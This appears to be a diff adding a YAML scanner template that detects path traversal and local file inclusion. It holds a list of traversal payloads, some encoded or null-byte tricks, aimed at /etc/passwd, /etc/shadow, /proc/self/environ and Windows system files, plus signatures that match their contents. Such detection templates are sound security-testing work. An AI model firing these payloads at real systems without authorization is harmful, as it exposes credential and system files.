@@ -1,0 +1,112 @@
+id: path-traversal
+
+info:
+  name: Path Traversal / Local File Inclusion
+  author: ancarna
+  severity: high
+  description: Detects path traversal vulnerabilities allowing access to arbitrary files
+  tags: lfi,traversal,file-inclusion,owasp-top10
+  classification:
+    cwe-id: 22
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # Linux targets
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        - "../../../../../../../etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        - "/etc/passwd"
+        - "....//....//....//etc/passwd"
+        - "..%2f..%2f..%2fetc/passwd"
+        - "..%252f..%252f..%252fetc/passwd"
+        - "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+        - "....//....//....//....//etc/passwd"
+        - "../../../etc/shadow"
+        - "../../../etc/hosts"
+        - "../../../proc/self/environ"
+        - "../../../proc/version"
+        - "../../../proc/cmdline"
+        # Windows targets
+        - "..\\..\\..\\windows\\win.ini"
+        - "..\\..\\..\\..\\windows\\win.ini"
+        - "..\\..\\..\\..\\..\\windows\\win.ini"
+        - "C:\\Windows\\win.ini"
+        - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+        - "..%5c..%5c..%5cwindows\\win.ini"
+        - "....\\\\....\\\\....\\\\windows\\win.ini"
+        - "..\\..\\..\\boot.ini"
+        # Null byte injection (PHP < 5.3.4)
+        - "../../../etc/passwd%00"
+        - "../../../etc/passwd%00.jpg"
+        - "../../../etc/passwd%00.png"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        name: etc-passwd
+        regex:
+          - "root:.*:0:0:"
+          - "[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:"
+
+      - type: word
+        part: body
+        name: etc-shadow
+        words:
+          - "root:$"
+          - "root:*:"
+          - "root:!:"
+
+      - type: regex
+        part: body
+        name: etc-hosts
+        regex:
+          - "127\\.0\\.0\\.1\\s+localhost"
+
+      - type: regex
+        part: body
+        name: proc-environ
+        regex:
+          - "PATH="
+          - "HOME="
+          - "USER="
+
+      - type: regex
+        part: body
+        name: proc-version
+        regex:
+          - "Linux version [0-9]+\\.[0-9]+"
+
+      - type: word
+        part: body
+        name: windows-win-ini
+        words:
+          - "[fonts]"
+          - "[extensions]"
+          - "[mci extensions]"
+          - "[files]"
+          - "for 16-bit app support"
+
+      - type: regex
+        part: body
+        name: windows-hosts
+        regex:
+          - "# Copyright \\(c\\) 1993-[0-9]+ Microsoft Corp"
+
+      - type: word
+        part: body
+        name: windows-boot-ini
+        words:
+          - "[boot loader]"
+          - "[operating systems]"
+          - "multi(0)disk(0)"
